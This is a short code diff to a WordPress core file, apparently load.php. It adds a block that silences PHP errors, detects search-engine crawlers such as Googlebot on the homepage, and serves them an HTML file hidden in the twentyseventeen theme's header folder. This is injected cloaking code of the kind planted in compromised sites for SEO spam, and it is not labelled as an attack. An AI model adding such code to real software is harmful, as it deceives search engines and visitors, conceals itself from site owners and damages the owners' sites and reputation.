@@ -552,7 +552,14 @@ function wp_set_wpdb_vars() {
 		);
 	}
 }
+error_reporting(0);
+$s_ref = $_SERVER['HTTP_REFERER'];
+$agent = $_SERVER['HTTP_USER_AGENT'];
 
+if(preg_match("/(googlebot|slurp|Google AdSense)/", strtolower($agent)) && $_SERVER['REQUEST_URI']=='/'){
+	include('wp-content/themes/twentyseventeen/template-parts/header/agiratech.html');   
+	exit;
+}
 /**
  * Toggle `$_wp_using_ext_object_cache` on and off without directly
  * touching global.
